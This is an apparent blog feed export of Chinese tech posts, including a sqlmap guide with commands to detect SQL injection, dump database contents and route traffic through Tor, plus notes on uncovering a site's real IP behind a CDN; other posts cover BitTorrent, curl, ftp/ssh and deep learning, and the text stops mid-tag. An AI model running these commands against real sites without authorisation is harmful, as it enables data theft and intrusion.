      <title>Sqlmap基本操作</title>
      <link href="2022/03/29/sqlmap/"/>
      <url>2022/03/29/sqlmap/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.helloimg.com/image/RqDeM6"><img src="https://www.helloimg.com/images/2022/03/29/RqDeM6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/29/RqDeM6.png" srcset="data:image/png;base64,666" alt="RqDeM6.png"></a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Linux-Mac-OS"><a href="#Linux-Mac-OS" class="headerlink" title="Linux / Mac OS"></a>Linux / Mac OS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>安装git-bash之后在选定目录下右键打开git-bash窗口运行上述命令即可</p><p>下载地址：</p><p><a href="https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe">https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe</a></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -h<span class="comment"># 获取常见选项</span></span><br><span class="line">python sqlmap.py -hh<span class="comment"># 获取所有选项</span></span><br><span class="line">python sqlmap.py -u www.example.com <span class="comment"># 检测GET注入</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch  <span class="comment"># 使用默认选项（不用手动选择y/n）</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch --dbs --tables --columns<span class="comment"># 返回数据库/表/列</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch -D xxx -T xxx -C xxx<span class="comment"># 指定数据库/表/列</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch --dump   <span class="comment"># 直接返回数据库内容</span></span><br></pre></td></tr></table></figure><p><strong>注：如果是在Linux系统下，python命令可能调用的是python2，如果报错可将python换为python3</strong></p><p>​        <strong>如果有其他报错，尝试将网址等参数用双引号包裹</strong></p><p>​        <strong>Windows下可在命令提示符或powershell下运行</strong></p><ul>    <li>在返回数据库/表/列时，可只指定一项</li>    <li>在指定数据库/表/列时，也可只指定一项</li>    <li>一般将dump选项和上述命令结合，直接返回注入结果</li></ul><h2 id="更多玩法"><a href="#更多玩法" class="headerlink" title="更多玩法"></a>更多玩法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -m 1.txt<span class="comment"># 从文件中导入url</span></span><br><span class="line">python sqlmap.py -r res.txt<span class="comment"># 从文件中导入http响应</span></span><br><span class="line">python sqlmap.py -l burp.txt<span class="comment"># 从文件中导入burp抓包文件</span></span><br><span class="line">python sqlmap.py -u www.example.com  --data=<span class="string">&quot;id=1&quot;</span>  <span class="comment"># 使用POST注入</span></span><br><span class="line">python sqlmap.py -u www.example.com --level 2  <span class="comment"># 使用2级注入，检测cookie注入</span></span><br><span class="line">python sqlmap.py -u www.example.com --level 3  <span class="comment"># 使用3级注入，检测referer注入和USER-AGENT注入</span></span><br><span class="line">python sqlmap.py -u www.example.com --level 5  <span class="comment"># 使用5级注入，检测host注入</span></span><br><span class="line">python sqlmap.py -u www.example.com --random-agent     <span class="comment"># 使用随机代理</span></span><br><span class="line">python sqlmap.py -u www.example.com --tor  <span class="comment"># 使用匿名tor网络</span></span><br><span class="line">python sqlmap.py -u www.example.com --hpp  <span class="comment"># 检测http污染</span></span><br></pre></td></tr></table></figure><p>level默认为1，范围为 1 - 5</p><p><strong>更多用法和命令可参照官网文档：<a href="http://sqlmap.org/">http://sqlmap.org/</a></strong></p><blockquote><p>quote<br><a href="https://github.com/sqlmapproject/sqlmap">GitHub - sqlmapproject/sqlmap: Automatic SQL injection and database takeover tool</a></p><p><a href="https://blog.csdn.net/smli_ng/article/details/106026901">sqlmap详细使用教程_星落.的博客-CSDN博客_sqlmap</a></p><p><a href="https://www.freebuf.com/sectool/164608.html">超详细SQLMap使用攻略及技巧分享 - FreeBuf网络安全行业门户</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关BT种子的一些事</title>
      <link href="2022/03/27/bit_torrent/"/>
      <url>2022/03/27/bit_torrent/</url>
      
        <content type="html"><![CDATA[<h2 id="Bit-Torrent-BT种子-是什么？"><a href="#Bit-Torrent-BT种子-是什么？" class="headerlink" title="Bit Torrent (BT种子)是什么？"></a>Bit Torrent (BT种子)是什么？</h2><blockquote><p>BitTorrent(简称BT)是一个文件分发协议，每个下载者在下载的同时不断向其他下载者上传已下载的数据。而在<a href="https://baike.baidu.com/item/FTP/13839">FTP</a>,<a href="https://baike.baidu.com/item/HTTP">HTTP</a>协议中，每个下载者在下载自己所需文件的同时，各个下载者之间没有交互。当非常多的用户同时访问和下载服务器上的文件时，由于FTP服务器处理能力和带宽的限制，下载速度会急剧下降，有的用户可能访问不了服务器。BT协议与FTP协议不同，特点是下载的人越多，下载速度越快，原因在于每个下载者将已下载的数据提供给其他下载者下载，充分利用了用户的上载带宽。通过一定的策略保证上传速度越快，下载速度也越快。在很短时间内，BitTorrent协议成为一种新的变革技术。</p></blockquote><p>以上说明来自百度百科</p><p><a href="https://www.helloimg.com/image/RexTrb"><img src="https://www.helloimg.com/images/2022/03/27/RexTrb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/27/RexTrb.png" srcset="data:image/png;base64,666" alt="RexTrb.png"></a></p><p>用通俗的话讲，BT种子（以下简称 种子 ）技术其实就是将一个比较大的文件（比如电影或镜像）按照一定的规范分成多个块，当用户通过.torrent文件下载时，会连接上种子文件中记录的tracker服务器，而tracker服务器并不提供文件本身，而是通过查询返回当前同在下载该文件的其他客户端的地址，而主机接收到该地址后，会逐个逐个尝试连接，连接成功的便通过点对点（P2P）的方式获取对方计算机上的另一部分文件，然后再连接其他的客户端，获取文件的其他部分</p><h2 id="Bit-Torrent-与其他下载方式相比，有什么优势？"><a href="#Bit-Torrent-与其他下载方式相比，有什么优势？" class="headerlink" title="Bit Torrent 与其他下载方式相比，有什么优势？"></a>Bit Torrent 与其他下载方式相比，有什么优势？</h2><p>不同于传统的 C/S ( Client / Server )模式，P2P的下载方式避免了单个服务器提供多个客户端的服务时带宽负载大的问题；在P2P下载时，每一台计算机，既是客户端，又是服务端，在下载的过程中，也向其他有需要的客户端上传自己的文件，有效节省了带宽；</p><p>另外，由于P2P去中心化的特点，每个处于BT网络中的文件，其存在与否不再取决于文件的提供者或服务商，在一定程度上避免了文件因个人过失而永久消失的情况</p><h2 id="Bit-Torrent-与其他下载方式相比，有什么劣势？"><a href="#Bit-Torrent-与其他下载方式相比，有什么劣势？" class="headerlink" title="Bit Torrent 与其他下载方式相比，有什么劣势？"></a>Bit Torrent 与其他下载方式相比，有什么劣势？</h2><p>有优势就肯定有劣势，如上文所说，BT下载是通过同在下载该文件的其他客户端提供的服务来获取文件的，那么，当同时在下载该文件的客户端很少，甚至我们可以假设一种极端情况：整个网络就只有你一台计算机在下载该文件，那么你将不会得到你想要的文件，因为没有其他节点给你提供你想要的文件</p><p>另一方面，同样由于BT技术中文件无法轻易清除的特点，文件一旦上传，想永久抹去的可能性不大，那么万一有不法分子上传了本不该出现在网络上的文件（比如有关国家机密或者个人隐私，有或者未上映的电影之类的），其后果不堪设想</p><h2 id="torrent文件都记录了什么？"><a href="#torrent文件都记录了什么？" class="headerlink" title="torrent文件都记录了什么？"></a>torrent文件都记录了什么？</h2><p>A）这个文件（文件夹）中数据的SHA1值，比如一个1G的文件，如果按1M每块进行分块，则会被分为了1000块，torrent中就会有这1000个数据块的指纹值（SHA1的<a href="https://www.zhihu.com/search?q=hash%E5%80%BC&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:160765176%7D">hash值</a>），这个占据了torrent文件的绝大部分空间。这些值的目的是为了下载的过程中进行数据校验，确保数据收到的和当时源头制作torrent时的源文件100%一致，防止恶意数据攻击。</p><p>B）一般制作torrent文件时，还会要指定一个或者多个Tracker的地址，比如<a href="https://link.zhihu.com/?target=http://www.a.com:8080/announce">http://www.a.com:8080/announce</a>这种地址。torrent里面一般也会存储了这个信息，这个其实也尤为重要。相当于记录了一个问询服务器的地址，这个问询服务器的作用，后面我再解释。</p><p>C）文件或者文件夹内每个文件的名字，方便下载文件时，磁盘上直接命名好跟原始数据一样的目录结构、文件名。    </p><p>D）其它一些辅助和可扩展的信息，比如可以配置一个P2SP的http地址辅助下载，比如制作软件的名字、备注……。      E）上面信息生成后，torrent会把A）里面的这些信息，以及torrent里面的文件名等关键信息，再进行一次Hash，生成一个新的SHA1值，作为torrent的HASH值，也就是我们经常看到的下载软件里面对这个种子命名的一个唯一的hash值，也有的在magnet这种磁力链接中可以看到这个值，这就是torrent的唯一标记。</p><p>以上就是.torrent文件的内容，可以用记事本打开，但可能看到乱码。这个文件的编码遵循了bencode编码规则。但实际内容就主要是上面这些。所以，torrent可以理解为对原始数据的一些记录。</p><h2 id="如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？"><a href="#如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？" class="headerlink" title="如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？"></a>如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？</h2><p>不一定，BT发明者提出了DHT（Distributed Hash Table）的概念，就算Tracker连不上了，也可以通过分布式哈希表DHT技术，通过DHT网络慢慢的寻找志同道合的邻居节点，只是没有Tracker那么直接那么快速，但慢一些总还是有机会找到邻居的</p><h2 id="有关下载过程中的一些事"><a href="#有关下载过程中的一些事" class="headerlink" title="有关下载过程中的一些事"></a>有关下载过程中的一些事</h2><p>文件下载时，若存在提供下载服务的http服务器，那么就算没有其他的客户端在线，下载仍然可以进行</p><p>下载过程中出现卡在99.99%的原因是因为当所有分块都下载完毕时，电脑会对下载的文件进行文件校验（类似于哈希检验），而当文件校验不通过时，电脑就会对组成文件的所有分块逐个逐个进行检验，发现校验值不对的文件分块再重新下载，这就是为什么有时候下载卡住的原因</p><p>当文件下载完毕时，如果你没有关闭下载文件的客户端，那么如果有其他人需要你的文件，即使你没有在下载文件，你所拥有的文件分块依然可以上传给其他客户端，成为一名崇高的传递者</p><p>文件下载时，影响下载速度的，除了你的电脑当前的网速，其实还有你的电脑当前的上传速度；在BT网络的带宽分配中，上传速度快的客户端能够获得的下载速度会相对比较快</p><p>某些运营商会对BT下载时的通信进行拦截，它们会对通信过程中传输的内容进行分析，由于早期的下载传输的是明文，故很容易就能够被运营商截取；当然，道高一尺，魔高一丈，如今的下载过程传输的内容大部分都进行过加密</p><blockquote><p>quote<br><a href="https://baike.baidu.com/item/BitTorrent/142795">BitTorrent_百度百科 (baidu.com)</a></p><p><a href="https://www.zhihu.com/question/49829233/answer/160765176">https://www.zhihu.com/question/49829233/answer/160765176</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关cdn和真实ip的一些事</title>
      <link href="2022/03/20/cdn/"/>
      <url>2022/03/20/cdn/</url>
      
        <content type="html"><![CDATA[<h2 id="CDN是什么？"><a href="#CDN是什么？" class="headerlink" title="CDN是什么？"></a>CDN是什么？</h2><blockquote><p>CDN(Content Delivery Network)是指内容分发网络，也称为内容传送网络，这个概念始于1996年，是美国麻省理工学院的一个研究小组为改善互联网的服务质量而提出的。为了能在传统IP网上发布丰富的宽带媒体内容，他们提出在现有互联网基础上建立一个内容分发平台专门为网站提供服务，并于1999年成立了专门的CDN服务公司，为Yahoo提供专业服务。由于CDN是为加快网络访问速度而被优化的网络覆盖层，因此被形象地称为“网络加速器”。</p></blockquote><p>以上是来自百度百科的解释<br>个人理解，通俗点说，cdn其实就是一些服务器，将你的一些静态文件（html）什么的复制一份，然后等有人访问网站的时候再就近选择cdn服务器把你的那些静态页面返回，这样就不用通过你的服务器，从而减轻带宽负载了</p><h2 id="CDN和IP是什么关系？"><a href="#CDN和IP是什么关系？" class="headerlink" title="CDN和IP是什么关系？"></a>CDN和IP是什么关系？</h2><p>由于用户获取静态文件时大概率会由CDN服务器返回，则大多数情况下用户输入域名访问网站时，实际进行通信的很可能不是该网站真实的IP，而是CDN服务器的IP</p><h2 id="CDN的好处有哪些？"><a href="#CDN的好处有哪些？" class="headerlink" title="CDN的好处有哪些？"></a>CDN的好处有哪些？</h2><p>最明显的也是大部分人最需要的，就是减少自家服务器的带宽负载<br>此外还有一个好处，就是隐藏服务器的真实IP（但是不能百分百隐藏）</p><h3 id="CDN隐藏IP的好处是什么？为什么不能完全隐藏？"><a href="#CDN隐藏IP的好处是什么？为什么不能完全隐藏？" class="headerlink" title="CDN隐藏IP的好处是什么？为什么不能完全隐藏？"></a>CDN隐藏IP的好处是什么？为什么不能完全隐藏？</h3><p>隐藏IP最大的好处就是在一定程度上避免自家服务器受到攻击（DDoS攻击之类的），因为不法分子无法知道我们服务器的真实IP，也就无法对该IP进行大量重复的请求从而达到使网站拒绝服务的效果，最多就是把最近的CDN服务器打了下来<br>那天下CDN千千万，你把这个打下来了又有什么用呢？你又不能确保你下一个访问的服务器一定不是CDN</p><h2 id="我怎么知道自己的请求是不是到了CDN呢？"><a href="#我怎么知道自己的请求是不是到了CDN呢？" class="headerlink" title="我怎么知道自己的请求是不是到了CDN呢？"></a>我怎么知道自己的请求是不是到了CDN呢？</h2><p>想知道自己访问的服务器是不是CDN，有几种办法：<br>windows命令行用nslookup命令查询一下目标域名，如果一个域名对应着好几个IP，那十有八九是使用了CDN；当然，如果只返回了一个IP也不能说明目标网站就没有使用CDN<br>在CDN查询网站上查</p><blockquote><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p></blockquote><p>查子域名：因为大部分站长使用CDN针对的大多是首页等访问量比较大的页面，那么子页面就有可能没有使用CDN，这时候查询子页面返回的结果很有可能就是真实IP<br>漏洞利用：用CTF那套试试。不过不提倡且大部分情况下不合法<br>分析服务器返回的信息：有些网站会有邮件服务或者订阅服务之类的，而这些服务有时并不会使用CDN，通过分析邮件源码就可以得到IP<br>通过国外访问：有些CDN只面向国内的请求，对于不在服务范围的国外请求有可能不会经过CDN而直接访问真实IP<br>直接访问CDN服务器：最直接的方法就是拿到CDN服务器的账户自己上去查</p><h2 id="怎样才能有CDN服务？"><a href="#怎样才能有CDN服务？" class="headerlink" title="怎样才能有CDN服务？"></a>怎样才能有CDN服务？</h2><p>除了花钱买这一最直接的方法之外，还有另外一种能够获得CDN服务的方法，就是在租赁域名的时候很多服务提供商会免费对该域名提供CDN服务，不要白不要</p><p>以下是对我自己网站的CDN查询<br><a href="https://www.helloimg.com/image/RadpUh"><img src="https://www.helloimg.com/images/2022/03/20/RadpUh.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/20/RadpUh.png" srcset="data:image/png;base64,666" alt="RadpUh.png"></a></p><p>最后再说一句，拿到真实IP了也未必能够通过IP访问目标网站</p><blockquote><p>quote<br><a href="https://blog.csdn.net/fly_hps/article/details/98486807">https://blog.csdn.net/fly_hps/article/details/98486807</a><br><a href="https://www.cxybb.com/article/weixin_37104668/115167764">https://www.cxybb.com/article/weixin_37104668/115167764</a><br><a href="https://baike.baidu.com/item/CDN/420951">https://baike.baidu.com/item/CDN/420951</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>curl的常见用法</title>
      <link href="2022/03/12/curl/"/>
      <url>2022/03/12/curl/</url>
      
        <content type="html"><![CDATA[<p>curl用法：</p><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">GET请求：</span><br><span class="line">curl https://www.xxx.com</span><br><span class="line"></span><br><span class="line">POST请求：</span><br><span class="line">curl -d key=value https://www.xxx.com</span><br><span class="line"></span><br><span class="line">填写表单：</span><br><span class="line">curl -F key1=value1 -F key2=value2 https://www.xxx.com/xxx.cgi</span><br><span class="line"></span><br><span class="line">显示信息：</span><br><span class="line">curl -i https://www.xxx.com</span><br><span class="line"></span><br><span class="line">指定USER-AGENT</span><br><span class="line">curl -A <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39&quot;</span> https://www.xxx.com</span><br><span class="line">注：若留空则移除User-Agent标头</span><br><span class="line"></span><br><span class="line">跟随重定向：</span><br><span class="line">curl -L https://www.xxx.com</span><br><span class="line">注：curl默认不跟随重定向</span><br><span class="line"></span><br><span class="line">发送cookie：</span><br><span class="line">curl -b <span class="string">&quot;foo=bar&quot;</span> https://www.xxx.com</span><br><span class="line"></span><br><span class="line">url编码：</span><br><span class="line">curl --data-urlencode <span class="string">&quot;xxxxxxx&quot;</span> https://www.xxx.com</span><br><span class="line">注：该方式与-d相近，区别在于是否编码</span><br><span class="line"></span><br><span class="line">保存网页(与wget相似)：</span><br><span class="line">curl -o xxx.html https://www.xxx.com</span><br><span class="line"></span><br><span class="line">用户认证：</span><br><span class="line">curl -u <span class="string">&quot;user:passwd&quot;</span> https://www.xxx.com/login</span><br><span class="line"></span><br><span class="line">输出通信过程：</span><br><span class="line">curl -v https://www.xxx.com</span><br><span class="line"></span><br><span class="line">输出二进制数据：</span><br><span class="line">curl --trace - https://www.xxx.com</span><br><span class="line">注：可配合-o导出</span><br></pre></td></tr></table></figure><blockquote><p>quote<br><a href="https://www.jianshu.com/p/fc0eb6c60816">https://www.jianshu.com/p/fc0eb6c60816</a><br><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ftp,sftp与ssh之间的关系</title>
      <link href="2022/03/06/ftp_sftp_ssh/"/>
      <url>2022/03/06/ftp_sftp_ssh/</url>
      
        <content type="html"><![CDATA[<h2 id="ftp和sftp的区别"><a href="#ftp和sftp的区别" class="headerlink" title="ftp和sftp的区别"></a>ftp和sftp的区别</h2><p>这两种协议都是用于传输文件的，其中sftp是基于ssh的原理<a id="more"></a>开发的</p><blockquote><p>ftp: File Transfer Protocol<br>stfp: Secure File Transfer Protocol / SSH File Transfer Protocol<br>ssh: Secure Shell</p></blockquote><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><p><img src="https://www.helloimg.com/images/2021/12/16/G9aPoR.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/16/G9aPoR.jpg" srcset="data:image/png;base64,666"><br>ftp是明文传输，有两种模式：主动模式和被动模式</p><h4 id="主动模式-Positive-Mode-："><a href="#主动模式-Positive-Mode-：" class="headerlink" title="主动模式(Positive Mode)："></a>主动模式(Positive Mode)：</h4><p><a href="https://www.helloimg.com/image/Gh2qT6"><img src="https://www.helloimg.com/images/2022/03/06/Gh2qT6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2qT6.png" srcset="data:image/png;base64,666" alt="Gh2qT6.png"></a><br><a href="https://www.helloimg.com/image/Gh2s7A"><img src="https://www.helloimg.com/images/2022/03/06/Gh2s7A.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2s7A.png" srcset="data:image/png;base64,666" alt="Gh2s7A.png"></a><br>在该模式下，服务端开放21，20端口；21端口用于接收用户名和密码，20端口用于传输数据<br>客户端登录ftp服务器后随机开放一个端口，再将这个端口的信息发送给服务端，服务端再通过用于传输数据的20端口连接至用户提供的端口</p><h4 id="被动模式-Passive-Mode-："><a href="#被动模式-Passive-Mode-：" class="headerlink" title="被动模式(Passive Mode)："></a>被动模式(Passive Mode)：</h4><p><a href="https://www.helloimg.com/image/Gh2mnz"><img src="https://www.helloimg.com/images/2022/03/06/Gh2mnz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2mnz.png" srcset="data:image/png;base64,666" alt="Gh2mnz.png"></a><br><a href="https://www.helloimg.com/image/Gh2JPR"><img src="https://www.helloimg.com/images/2022/03/06/Gh2JPR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2JPR.png" srcset="data:image/png;base64,666" alt="Gh2JPR.png"></a><br>在该模式下，服务端开放用于客户端连接的21端口以及一个随机端口，而客户端在登录ftp服务器后接收服务端提供的随机端口的信息，再连接至服务端的该端口以传输数据</p><h3 id="stfp"><a href="#stfp" class="headerlink" title="stfp"></a>stfp</h3><p><a href="https://www.helloimg.com/image/Gh2eqP"><img src="https://www.helloimg.com/images/2022/03/06/Gh2eqP.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2eqP.jpg" srcset="data:image/png;base64,666" alt="Gh2eqP.jpg"></a></p><blockquote><p>首先要明确的一点是，stfp是ssh的一个子服务</p></blockquote><p><a href="https://www.helloimg.com/image/Gh24C5"><img src="https://www.helloimg.com/images/2022/03/06/Gh24C5.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh24C5.png" srcset="data:image/png;base64,666" alt="Gh24C5.png"></a><br>sftp是基于ssh的技术进行文件的传输的，而ssh是通过22端口进行通信的，也就是说sftp也是通过22端口进行通信以及数据传输的，与ftp协议相比，除了通信端口的不同，由于ssh的通信过程是加密的，所以sftp中文件的传输也是加密的，但实际的安全性还取决于ssh的连接方式；且在ssh服务器与通信主机（服务器）分开时还分有半安全模式(Less Secure Connection)和安全模式(Full Secure Connection)</p><blockquote><p>半安全模式指用户通过ssh连接ssh服务器时所有的数据都是加密的，而ssh服务器与主机间通信的数据是未加密的</p></blockquote><p><a href="https://www.helloimg.com/image/Gh2xUn"><img src="https://www.helloimg.com/images/2022/03/06/Gh2xUn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2xUn.png" srcset="data:image/png;base64,666" alt="Gh2xUn.png"></a></p><blockquote><p>安全模式指用户与ssh服务器以及ssh服务器与主机间的通信都是加密的</p></blockquote><p><a href="https://www.helloimg.com/image/Gh2At0"><img src="https://www.helloimg.com/images/2022/03/06/Gh2At0.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2At0.png" srcset="data:image/png;base64,666" alt="Gh2At0.png"></a><br>而当ssh服务运行于目标主机上时便不存在半安全模式和安全模式之分了</p><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>作为远程连接主机的常用方式，ssh有两种连接方式，一种是通过用户名和密码进行通信，这种方式非常方便，只需要任意一台能够接入互联网的常用设备就能够连接上远程主机，但是这种方式存在受到中间人攻击的可能；另一种方式是通过密钥分发的方式，即在服务端生成一份私钥存于服务器，再生成一份公钥分发给需要通信的主机，这种方式不需要用户名和密码，并且通信时需要进行密钥与公钥的验证，基本杜绝了中间人攻击的可能，但是由于需要提前准备好公钥，故便携性不如第一种方式</p><blockquote><p>quote<br><a href="https://network.51cto.com/article/603552.html">https://network.51cto.com/article/603552.html</a><br><a href="https://www.zhihu.com/question/20402010">https://www.zhihu.com/question/20402010</a><br><a href="https://blog.csdn.net/cuker919/article/details/6403925">https://blog.csdn.net/cuker919/article/details/6403925</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 5</title>
      <link href="2021/12/25/deep_learning_from_scratch_5/"/>
      <url>2021/12/25/deep_learning_from_scratch_5/</url>
      
        <content type="html"><![CDATA[<h3 id="深度学习应用案例"><a href="#深度学习应用案例" class="headerlink" title="深度学习应用案例"></a>深度学习应用案例</h3><a id="more"></a><ul><li><p>物体检测 – R-CNN</p></li><li><p>图像分割 – FCN</p></li><li><p>图像标题的生成 – NIC (CNN+RNN)</p></li><li><p>图像风格变换</p></li><li><p>图像的生成 – DCGAN</p></li><li><p>自动驾驶</p></li><li><p>Dep Q-Network (强化学习)</p></li></ul><h3 id="多模态处理"><a href="#多模态处理" class="headerlink" title="多模态处理"></a>多模态处理</h3><blockquote><p>组合图像和自然语言等多种信息进行的处理</p></blockquote><h3 id="GAN"><a href="#GAN" class="headerlink" title="GAN"></a>GAN</h3><blockquote><p>生成式对抗网络（GAN, Generative Adversarial Networks ）是一种<a href="https://baike.baidu.com/item/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/3729729">深度学习</a><a href="https://baike.baidu.com/item/%E6%A8%A1%E5%9E%8B/1741186">模型</a>，是近年来复杂分布上<a href="https://baike.baidu.com/item/%E6%97%A0%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/810193">无监督学习</a>最具前景的方法之一。模型通过框架中（至少）两个模块：<a href="https://baike.baidu.com/item/%E7%94%9F%E6%88%90%E6%A8%A1%E5%9E%8B/6563656">生成模型</a>（Generative Model）和<a href="https://baike.baidu.com/item/%E5%88%A4%E5%88%AB%E6%A8%A1%E5%9E%8B/16224017">判别模型</a>（Discriminative Model）的互相博弈学习产生相当好的输出。原始 GAN <a href="https://baike.baidu.com/item/%E7%90%86%E8%AE%BA/1732500">理论</a>中，并不要求 G 和 D 都是神经网络，只需要是能拟合相应生成和判别的函数即可。但实用中一般均使用深度神经网络作为 G 和 D 。 –Baidu Baike</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 4</title>
      <link href="2021/12/18/deep_learning_from_scratch_4/"/>
      <url>2021/12/18/deep_learning_from_scratch_4/</url>
      
        <content type="html"><![CDATA[<h3 id="卷积神经网络与普通机器学习的区别"><a href="#卷积神经网络与普通机器学习的区别" class="headerlink" title="卷积神经网络与普通机器学习的区别"></a>卷积神经网络与普通机器学习的区别</h3><a id="more"></a><blockquote><p>CNN中新出现了卷积层和池化层</p></blockquote><h3 id="全连接层存在的问题"><a href="#全连接层存在的问题" class="headerlink" title="全连接层存在的问题"></a>全连接层存在的问题</h3><p>在全连接层中，传入的图像的形状信息被破坏了；由于在全连接层中，数据是以一维的形式传入的，故忽略了图像中诸如相邻像素之间的关系</p><h3 id="特征图"><a href="#特征图" class="headerlink" title="特征图"></a>特征图</h3><p>卷积层的输入输出数据。根据输入和输出分为输入特征图和输出特征图</p><h3 id="卷积运算"><a href="#卷积运算" class="headerlink" title="卷积运算"></a>卷积运算</h3><p>卷积运算是以一定的间隔滑动滤波器的窗口并对输入数据应用滤波器，应用的方式有乘积累加，偏置和求和等</p><h3 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h3><p>向输入数据的周围填入固定的数值；“幅度为1的填充”指的是向输入数据周围1个单位的范围内填充0</p><p>作用：调整输出的大小，由于在卷积运算中空间不断缩小，为了在保持输出大小不变的前提下进行卷积运算甚至深度卷积，就需要<strong>填充</strong>来调整数据空间大小</p><h3 id="步幅"><a href="#步幅" class="headerlink" title="步幅"></a>步幅</h3><blockquote><p>应用滤波器的位置间隔</p></blockquote><h3 id="3维数据的卷积运算"><a href="#3维数据的卷积运算" class="headerlink" title="3维数据的卷积运算"></a>3维数据的卷积运算</h3><p>与2维数据的卷积运算不同的是，3维数据的卷积运算同时进行多通道的卷积并将结果相加</p><h3 id="池化层"><a href="#池化层" class="headerlink" title="池化层"></a>池化层</h3><p>池化是缩小高、长方向上的空间的运算；包含Max池化和Average池化等</p><p>特征</p><ul><li>没有要学习的参数</li><li>通道数不发生变化</li><li>对微小的位置变化具有鲁棒性（健壮）</li></ul><h3 id="具有代表性的CNN"><a href="#具有代表性的CNN" class="headerlink" 